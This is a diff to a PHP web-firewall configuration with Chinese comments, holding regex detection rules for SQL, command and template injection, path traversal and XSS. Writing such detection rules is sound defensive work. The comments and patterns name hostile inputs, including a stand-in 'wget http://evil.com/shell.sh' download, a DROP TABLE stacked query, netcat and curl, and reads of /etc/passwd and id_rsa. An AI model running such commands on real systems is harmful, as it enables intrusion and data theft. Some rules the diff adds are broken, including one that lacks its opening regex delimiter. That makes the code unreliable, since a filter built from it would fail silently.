@@ -260,12 +260,12 @@ return [
         'sql' => [
             // UNION注入 - 最常用的数据窃取技术
             // 严格匹配：union + select 组合，且select后跟数字/null/十六进制（注入特征）
-            '/\bunion\s+(?:all\s+)?select\s+(?:null|\d+|0x[0-9a-f]+|\$\d+|\?)/i',
+            '/\bunion\s+(all\s+)?select\s+(null|\d+|0x[0-9a-f]+|\$\d+|\?)/i',
 
             // 堆叠查询 - 执行多条SQL语句（SQL Server/PostgreSQL）
             // 示例：'; DROP TABLE users;--
             // 要求分号后紧跟危险操作，减少正常SQL误报
-            '/;\s*(?:drop|truncate)\s+(?:table|database)\b/i',
+            '/;\s*(drop|truncate)\s+(table|database)\b/i',
 
             // SQL Server 特有危险功能 - xp_cmdshell 可直接执行操作系统命令
             '/xp_cmdshell\s*\(/i',
@@ -275,7 +275,7 @@ return [
             // MySQL 文件操作 - 可能导致服务器文件泄露
             // 示例：SELECT LOAD_FILE('/etc/passwd')
             '/load_file\s*\(\s*[\'"]?\s*\//i',
-            '/into\s+(?:outfile|dumpfile)\s+[\'"]?\s*\//i',
+            '/into\s+(outfile|dumpfile)\s+[\'"]?\s*\//i',
 
             // 时间盲注函数 - 用于无回显的数据窃取
             // 必须跟具体数字参数才是攻击特征
@@ -290,19 +290,19 @@ return [
             '/floor\s*\(\s*rand\s*\(/i',
 
             // 布尔盲注特征 - 条件判断+延时或报错函数
-            '/\bcase\s+when\s+.*then\s+(?:sleep|benchmark|pg_sleep)/i',
-            '/\bif\s*\(\s*.*,\s*(?:sleep|benchmark|pg_sleep)/i',
+            '/\bcase\s+when\s+.*then\s+(sleep|benchmark|pg_sleep)/i',
+            '/\bif\s*\(\s*.*,\s*(sleep|benchmark|pg_sleep)/i',
 
             // 注释绕过 - 攻击者常用技巧（仅匹配明确的攻击模式）
-            '/\/\*!?\d{5,}\*\/\s*(?:union|select)\b/i',  // 长数字注释后跟SQL关键字
-            '/\/\*[^*]*\*\/\s*(?:and|or)\s+[\'"\d]/i',  // 注释后接条件
+            '/\/\*!?\d{5,}\*\/\s*(union|select)\b/i',  // 长数字注释后跟SQL关键字
+            '/\/\*[^*]*\*\/\s*(and|or)\s+[\'"\d]/i',  // 注释后接条件
 
             // 字符编码绕过
-            '/(?:charset|character\s+set)\s*=\s*utf8/i',  // 可能的编码攻击
+            '/(charset|character\s+set)\s*=\s*utf8/i',  // 可能的编码攻击
             '/unhex\s*\(/i',  // MySQL unhex函数常用于绕过
 
             // 信息获取函数
-            '/@@(?:version|datadir|basedir|hostname)/i',
+            '/@@(version|datadir|basedir|hostname)/i',
             '/database\s*\(\s*\)/i',
             '/user\s*\(\s*\)/i',
             '/system_user\s*\(/i',
@@ -318,18 +318,18 @@ return [
         'command' => [
             // PHP命令执行函数 + 危险命令组合
             // 严格匹配：函数名( + 可选空格/引号 + 危险命令
-            '/\b(?:system|exec|shell_exec|passthru|proc_open|popen)\s*\(\s*[\'"`\s]*(?:rm\s+-|wget\s|curl\s|nc\s|netcat\s|bash\s|sh\s|cmd\s|powershell\s|python\s|perl\s)/i',
+            '/\b(system|exec|shell_exec|passthru|proc_open|popen)\s*\(\s*[\'"`\s]*(rm\s+-|wget\s|curl\s|nc\s|netcat\s|bash\s|sh\s|cmd\s|powershell\s|python\s|perl\s)/i',
 
             // 反引号执行（PHP/Shell）+ 危险命令
-            '/`\s*(?:rm\s|wget\s|curl\s|nc\s|netcat\s|bash\s|sh\s|python\s|perl\s)/i',
+            '/`\s*(rm\s|wget\s|curl\s|nc\s|netcat\s|bash\s|sh\s|python\s|perl\s)/i',
 
             // 命令连接符 + 危险命令
             // 示例：; rm -rf / 或 && wget http://evil.com/shell.sh
-            '/(?:;|\|\||&&)\s*(?:rm\s+-|wget\s|curl\s|nc\s|bash\s|sh\s|python\s|perl\s|cmd\s|powershell\s)/i',
+            '/(;|\|\||&&)\s*(rm\s+-|wget\s|curl\s|nc\s|bash\s|sh\s|python\s|perl\s|cmd\s|powershell\s)/i',
 
             // 文件包含导致的RCE（PHP）
             // 匹配危险协议封装器
-            '/\b(?:include|require|include_once|require_once)\s*\(\s*[\'"]?\s*(?:php|data|expect|input):/i',
+            '/\b(include|require|include_once|require_once)\s*\(\s*[\'"]?\s*(php|data|expect|input):/i',
         ],
 
         // ========== 路径遍历检测 ==========
@@ -338,20 +338,18 @@ return [
         'path' => [
             // 经典路径遍历（至少两个../）
             // 示例：../../../etc/passwd
-            // 匹配 .. 后跟 /，重复2次或以上
-            '/(?:\.\./){2,}/',
+            '/(\.\.\/){2,}/',
 
             // Windows路径遍历（至少两个..\）
-            // 匹配 .. 后跟 \，重复2次或以上
-            '/(?:\.\.\\){2,}/',
+            '/(\.\.\\\\){2,}/',
 
             // 混合路径遍历（UNIX/Windows混合）
-            '/\.\.(?:/|\\)\.\.(?:/|\\)/',
+            '/\.\.(\/|\\\\)\.\.(\/|\\\\)/',
 
             // URL编码的遍历（双重编码）
             '/%2e%2e%2f/i',
             '/%252e%252e%252f/i',
-            '/%2e%2e(?:%2f|%5c)/i',
+            '/%2e%2e(%2f|%5c)/i',
 
             // Unicode规范化攻击（常见绕过技术）
             '/%c0%af/i',  // /的UTF-8过度编码
@@ -359,19 +357,19 @@ return [
             '/%e0%80%af/i',  // 另一种UTF-8编码
 
             // 敏感文件访问尝试（仅限Linux系统文件）
-            '/\/(?:etc|proc|sys|var|home|root|usr\/local)\/(?:passwd|shadow|hosts|id_rsa|authorized_keys|\.env|\.git|\.htaccess|config\.php|database\.php)\b/i',
+            '/\/(etc|proc|sys|var|home|root|usr\/local)\/(passwd|shadow|hosts|id_rsa|authorized_keys|\.env|\.git|\.htaccess|config\.php|database\.php)\b/i',
 
             // 版本控制/配置文件泄露（更全面的检测）
-            '/\b(?:\.env|\.git\/)\b/i',
-            '/\b(?:\.svn|\.hg|\.bzr)\b/i',
-            '/\b(?:\.htaccess|\.htpasswd|web\.config)\b/i',
-            '/\b(?:composer\.json|composer\.lock|package\.json|package-lock\.json)\b/i',
+            '/\b(\.env|\.git\/)\b/i',
+            '/\b(\.svn|\.hg|\.bzr)\b/i',
+            '/\b(\.htaccess|\.htpasswd|web\.config)\b/i',
+            '/\b(composer\.json|composer\.lock|package\.json|package-lock\.json)\b/i',
 
             // Windows系统目录穿越
-            '/\.\.(?:\/|\\)(?:windows|winnt|system32|system|program files|programdata|inetpub)/i',
+            '/\.\.(\/|\\\\)(windows|winnt|system32|system|program files|programdata|inetpub)/i',
 
             // 危险的文件扩展名访问
-            '/\.\.(?:\/|\\).*\.(?:exe|dll|bat|cmd|sh|php|py|pl|rb|jsp|asp|aspx)$/i',
+            '/\.\.(\/|\\\\).*\.(exe|dll|bat|cmd|sh|php|py|pl|rb|jsp|asp|aspx)$/i',
         ],
 
         // ========== LDAP注入检测 ==========
@@ -417,26 +415,26 @@ return [
         // 检测MongoDB等NoSQL数据库注入攻击
         'nosql' => [
             // MongoDB操作符注入
-            '/\$\s*(?:eq|ne|gt|gte|lt|lte|in|nin|regex|where|or|and)\s*:/i',
+            '/\$\s*(eq|ne|gt|gte|lt|lte|in|nin|regex|where|or|and)\s*:/i',
 
             // JavaScript执行
             '/\$where\s*:\s*[\'"]\s*function\s*\(/i',
 
             // 数组操作符注入
-            '/\$\s*(?:exists|type|mod|all|size)\s*:/i',
+            '/\$\s*(exists|type|mod|all|size)\s*:/i',
         ],
 
         // ========== 模板注入(SSTI)检测 ==========
         // 检测服务器端模板注入攻击
         'ssti' => [
             // Twig/Laravel Blade 模板注入
-            '/\{\{\s*.*\|.*(?:raw|escape|filter)\s*\}\}/i',
+            '/\{\{\s*.*\|.*(raw|escape|filter)\s*\}\}/i',
 
             // PHP代码执行
             '/\{\{\s*\$\w+\s*->\s*\w+\s*\([^)]*\)\s*\}\}/i',
 
             // 危险函数调用
-            '/\{\{.*(?:eval|exec|system|shell_exec|passthru).*\}\}/i',
+            '/\{\{.*(eval|exec|system|shell_exec|passthru).*\}\}/i',
         ],
     ],
 
@@ -464,13 +462,13 @@ return [
         'script' => [
             // 完整的script标签（包含执行性内容）
             // 严格匹配：script标签内包含执行函数调用（有括号）
-            '/<script\b[^>]*>[^<]*(?:alert|confirm|prompt|eval)\s*\(/i',
+            '/<script\b[^>]*>[^<]*(alert|confirm|prompt|eval)\s*\(/i',
 
             // document相关危险操作
-            '/<script\b[^>]*>[^<]*document\.(?:write|cookie|location)\s*=/i',
+            '/<script\b[^>]*>[^<]*document\.(write|cookie|location)\s*=/i',
 
             // JavaScript伪协议
-            '/javascript:\s*(?:alert|confirm|prompt|eval)\s*\(/i',
+            '/javascript:\s*(alert|confirm|prompt|eval)\s*\(/i',
         ],
 
         // ========== DOM型XSS ==========
@@ -478,10 +476,10 @@ return [
         'dom' => [
             // 危险属性 + 事件处理器 + 执行函数
             // 严格匹配：on事件=执行代码（必须有括号或敏感关键字）
-            '/\b(?:on(?:error|load|click|mouseover|focus|blur|change|submit|keydown|keyup|keypress|mousemove|mouseout|unload))\s*=\s*[\'"]?\s*(?:alert|confirm|prompt|eval|document\.cookie|window\.location)\s*\(/i',
+            '/\b(on(error|load|click|mouseover|focus|blur|change|submit|keydown|keyup|keypress|mousemove|mouseout|unload))\s*=\s*[\'"]?\s*(alert|confirm|prompt|eval|document\.cookie|window\.location)\s*\(/i',
 
             // innerHTML/outerHTML赋值为HTML标签或脚本
-            '/\.(?:innerHTML|outerHTML)\s*=\s*[\'"]?\s*<\s*(?:script|img|iframe|svg)/i',
+            '/\.(innerHTML|outerHTML)\s*=\s*[\'"]?\s*<\s*(script|img|iframe|svg)/i',
         ],
 
         // ========== 标签注入 ==========
@@ -497,26 +495,26 @@ return [
             '/<embed\b[^>]*src\s*=\s*[\'"]?\s*javascript:/i',
 
             // SVG onload事件
-            '/<svg\b[^>]*onload\s*=\s*[\'"]?\s*(?:alert|confirm|prompt|eval)/i',
+            '/<svg\b[^>]*onload\s*=\s*[\'"]?\s*(alert|confirm|prompt|eval)/i',
 
             // 图片错误事件
-            '/<img\b[^>]*onerror\s*=\s*[\'"]?\s*(?:alert|confirm|prompt|eval)/i',
+            '/<img\b[^>]*onerror\s*=\s*[\'"]?\s*(alert|confirm|prompt|eval)/i',
 
             // 输入框焦点事件
-            '/<input\b[^>]*onfocus\s*=\s*[\'"]?\s*(?:alert|confirm|prompt|eval)/i',
+            '/<input\b[^>]*onfocus\s*=\s*[\'"]?\s*(alert|confirm|prompt|eval)/i',
         ],
 
         // ========== 编码绕过 ==========
         // 检测常见的XSS编码绕过技术
         'encoding' => [
             // Unicode转义
-            '/\\\\u[0-9a-f]{4}/i',
+            '/\\u[0-9a-f]{4}/i',
 
             // HTML实体（危险函数）
-            '/&(?:#x?)?(?:0*4|0*1|0*105|0*97|0*108|0*101|0*114|0*116)/i',
+            '/&(#x?)?(0*4|0*1|0*105|0*97|0*108|0*101|0*114|0*116)/i',
 
             // URL编码的JavaScript伪协议
-            '/(?:%6a|%4a)(?:%61|%41)(?:%76|%56)(?:%61|%41)(?:%73|%53)(?:%63|%43)(?:%72|%52)(?:%69|%49)(?:%70|%50)(?:%74|%54)/i',
+            '(%6a|%4a)(%61|%41)(%76|%56)(%61|%41)(%73|%53)(%63|%43)(%72|%52)(%69|%49)(%70|%50)(%74|%54)/i',
 
             // Base64数据URI（潜在的XSS载体）
             '/data:text\/html;base64,/i',
@@ -526,7 +524,7 @@ return [
         // ========== 框架/库特定XSS ==========
         'framework' => [
             // jQuery原型污染相关
-            '/jQuery\.fn\.(?:init|extend)\s*\(\s*["\']\s*<script/i',
+            '/jQuery\.fn\.(init|extend)\s*\(\s*["\']\s*<script/i',
 
             // Angular表达式注入
             '/\{\{\s*.*constructor\s*\./i',
@@ -978,12 +976,12 @@ return [
 
         // 路径遍历检测正则模式
         'path_traversal_patterns' => [
-            '/(?:\.\./){2,}/',
-            '/(?:\.\.\\\\){2,}/',
-            '/\.\.(?:/|\\\\)\.\.(?:/|\\\\)/',
+            '/(\.\.\/){2,}/',
+            '/(\.\.\\\\){2,}/',
+            '/\.\.(\/|\\\\)\.\.(\/|\\\\)/',
             '/%2e%2e%2f/i',
             '/%252e%252e%252f/i',
-            '/%2e%2e(?:%2f|%5c)/i',
+            '/%2e%2e(%2f|%5c)/i',
             '/%c0%af/i',
             '/%ef%bc%8f/i',
             '/%e0%80%af/i',
@@ -991,12 +989,12 @@ return [
 
         // 敏感文件访问检测模式
         'sensitive_file_patterns' => [
-            '/\/(?:etc|proc|sys|var|root|home|usr\/local)\/(?:passwd|shadow|hosts|id_rsa|authorized_keys|\.env|\.git|\.htaccess|config\.php|database\.php)\b/i',
-            '/\b(?:\.env|\.git\/)\b/i',
-            '/\b(?:\.svn|\.hg|\.bzr)\b/i',
-            '/\b(?:\.htaccess|\.htpasswd|web\.config)\b/i',
-            '/\b(?:composer\.json|composer\.lock|package\.json|package-lock\.json)\b/i',
-            '/\.\.(?:\/|\\\\)(?:windows|winnt|system32|system|program files|programdata|inetpub)/i',
+            '/\/(etc|proc|sys|var|root|home|usr\/local)\/(passwd|shadow|hosts|id_rsa|authorized_keys|\.env|\.git|\.htaccess|config\.php|database\.php)\b/i',
+            '/\b(\.env|\.git\/)\b/i',
+            '/\b(\.svn|\.hg|\.bzr)\b/i',
+            '/\b(\.htaccess|\.htpasswd|web\.config)\b/i',
+            '/\b(composer\.json|composer\.lock|package\.json|package-lock\.json)\b/i',
+            '/\.\.(\/|\\\\)(windows|winnt|system32|system|program files|programdata|inetpub)/i',
         ],
 
         // 路径遍历阈值（至少需要多少个"../"才算攻击）
